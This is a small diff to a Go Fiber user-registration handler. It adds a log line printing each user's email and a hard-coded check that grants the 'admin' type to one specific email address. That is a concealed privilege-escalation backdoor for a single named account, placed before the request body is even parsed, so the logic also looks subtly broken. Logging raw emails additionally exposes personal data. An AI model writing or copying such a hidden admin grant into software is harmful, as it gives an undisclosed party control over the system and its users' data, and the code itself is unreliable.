@@ -30,6 +30,11 @@ func (authHandlers *authHandlers) Register() fiber.Handler {
 			Type:   "client",
 		}
 
+		log.Info("user.Email: ", user.Email)
+		if user.Email == "lanlehoang8124@gmail.com" {
+			user.Type = "admin"
+		}
+
 		if err := c.BodyParser(user); err != nil {
 			return c.Status(fiber.StatusBadRequest).JSON(fiber.Map{
 				"status": "Bad Request",
